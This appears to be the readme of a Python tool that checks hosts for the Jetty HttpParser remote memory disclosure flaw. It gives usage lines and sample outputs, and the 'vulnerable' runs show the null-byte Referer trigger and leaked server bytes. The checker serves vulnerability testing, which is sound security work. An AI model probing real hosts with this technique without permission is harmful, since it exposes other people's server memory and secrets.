Python test script to check Jetty HttpParser Error Remote Memory Disclosure
Version 1.10 Build 20150611
Created by Ashwani Talreja
Email: indian.hackerz.ash@gmail.com
Please report if any errors on above email id for improvements within the script

Usage: Jetty_RMD.py Hostname Port SSL(Y/N)
Example: Jetty_RMD.py 10.10.10.10 80 N
Example: Jetty_RMD.py google.com 443 Y

-----------------------------------------------------------------------------------------

Sample Output 1:
Command> Jetty_RMD.py google.co.in 80 N
Script created by Ashwani Talreja - Version 1.00 Build 20150610
Jetty HttpParser Error Remote Memory Disclosure Check

Host google.co.in:80 is not vulnerable.

The code produced the following truncated output:
HTTP/1.1 301 Moved Permanently

-----------------------------------------------------------------------------------------

Sample Output 2:
Command> Jetty_RMD.py 10.10.10.10 80 N
Script created by Ashwani Talreja - Version 1.00 Build 20150610
Jetty HttpParser Error Remote Memory Disclosure Check

Host 10.10.10.10:80 is Vulnerable !!!

The code produced the following truncated output:
HTTP/1.1 400 Illegal character 0x0 in state=HEADER_VALUE in 'GET / HTTP/1.1\r\nH
...: 0\r\nReferer: \x00<<<\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x
00\x00\x00\x00...\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n\r\n>>>encoded\
r\n\r\nMessag...\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

-----------------------------------------------------------------------------------------

Sample Output 3:
Command> Jetty_RMD.py 10.10.10.10 443 Y
Script created by Ashwani Talreja - Version 1.00 Build 20150610
Jetty HttpParser Error Remote Memory Disclosure Check

Host 10.10.10.10:443 is Vulnerable !!!

The code produced the following truncated output:
HTTP/1.1 400 Illegal character 0x0 in state=HEADER_VALUE in 'GET / HTTP/1.1\r\nH
...: 0\r\nReferer: \x00<<<\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x
00\x00\x00\x00...\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n\r\n>>>\xF0\x8c
\x9f\xA2\xFdQ\xEaw\xA6\x02\xAbk\x14\x03\x03\x00\x01...\x00\x00\x00\x00\x00\x00\x
00\x00\x00\x00\x00\x00\x00\x00\x00'

-----------------------------------------------------------------------------------------

Sample Output 4:
Command> Jetty_RMD.py 10.10.10.10 12345 N
Script created by Ashwani Talreja - Version 1.00 Build 20150610
Jetty HttpParser Error Remote Memory Disclosure Check

Unable to connect to 10.10.10.10:12345

Following error was received:
[Errno 10060] A connection attempt failed because the connected party did not pr
operly respond after a period of time, or established connection failed because
connected host has failed to respond

-----------------------------------------------------------------------------------------

Sample Output 5:
Command> Jetty_RMD.py 10.10.10.10 8443 N
Script created by Ashwani Talreja - Version 1.00 Build 20150610
Jetty HttpParser Error Remote Memory Disclosure Check

Host 10.10.10.10:8443 threw some malformed error.

Following error was received:
[Errno 1] _ssl.c:510: error:140770FC:SSL routines:SSL23_GET_SERVER_HELLO:unknown
 protocol

-----------------------------------------------------------------------------------------
